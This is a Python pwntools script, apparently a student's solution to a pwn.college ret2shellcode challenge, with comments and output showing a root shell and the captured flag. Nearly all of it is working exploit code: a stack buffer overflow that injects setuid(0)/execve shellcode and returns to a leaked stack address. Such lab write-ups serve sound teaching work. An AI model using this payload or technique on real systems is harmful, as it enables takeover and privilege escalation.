#!/usr/bin/env python3
import pwn 

'''
Python script submission for the 'intro_challenge' binary.
By Sparsh Mehta/hutgrabber
---------------------- PREFACE ----------------------
This is a basic ret2shellcode binary exploitation challenge.
Students are supposed to use the pwntools framework along with
GDB in order to inject shellcode onto the stack and return to it
using a buffer overflow attack that essentially takes control
of the instruction pointer.
'''

'''
credits - Kenneth Miltenberger - for the pwntools boilerplate code.
this function gives us an option to start GDB on a local binary or on a remote server,
or just run this script without GDB attached.
'''
def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw, aslr=True)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw, aslr=True)

# setting the binary path.
binPath="/challenge/intro_challenge"
isRemote = pwn.args.REMOTE

'''
We will break at a point in the vuln function just before fgets gets called.
This where the buffer gets loaded onto the stack.
'''
gdbscript = '''
break *vuln+83
continue
'''.format(**locals())

# pointing pwntools to the binary.
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)

io=start()


'''
The shell code is taken from shell-storm. In a nutshell, this shell code first
makes the bianary a setuid(0) binary, and it calls the execve('/bin/sh') function
which will spawn a shell without dropping any privileges.

references - http://shell-storm.org/shellcode/files/shellcode-77.html
'''
shell_code = b'\x48\x31\xff\xb0\x69\x0f\x05\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

'''
The nops_start are 4 nops that we want to put before the shellcode to pad it.
Similarly, in the end, we will put some more nops using the nops_end variable.
The total number of nops are calculated by first taking the total buffersize
including the overflow (88) and then subtracting the length (in bytes) of the
shellcode.
'''
nops_start = b'\x90' * 4
nops_end = b'\x90' * (88 - len(shell_code) - 4) # removing 4 and adding 4 nops in the start

'''
using a little bit of ✨python magic✨ for getting the address that is being leaked.
We receive the line that prints the address first and then we split it based on spaces.
We filter the first two parts of the split and accept the third one with [2]. Next, we
use the int() function to convert the hex address into an integer, add 4 to it, and 
use the pwn.pack-64 function to arrange it according to the little endian format, ready
to be put on top of the stack.

** Why do we add 4 to the address? **
While examining the stack after the payload was on it, I found that the address that was being
leaked, was 4 bytes off. So, to adjust for that, I just added 4 bytes to the leaked address and
that way, it perfectly pointed to our 88-byte-buffer on the stack.
'''

leak = io.recvline()
leak = leak.split()[2]
leak = pwn.p64(int(leak, 16) + 4)

# Using pwn.flat([]) to arrange the payload into a single string.
payload = pwn.flat([
    nops_start,
    shell_code,
    nops_end,
    leak
]) 

io.recvuntil(b': ', timeout=1)
io.sendline(payload)
io.interactive()

'''
---------------------- OUTPUT ----------------------

[+] Starting local process '/challenge/intro_challenge': pid 13302
[*] Switching to interactive mode
Enter input: \x90\x90\x90\x90H1\xff\xb0i\x0f\x051\xc0H\xbbѝ\x96\x91Ќ\x97
\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
\x90\x90\x90\x90\x90\xb0\x94-}\xfd\x7f
$ id
uid=0(root) gid=1000(hacker) groups=1000(hacker)
$ cat /flag
pwn.college{k5Yy0jHfgX3oa0yhaUYWrRfQr1C.dNzM1QDLzEzN1QzW}

'''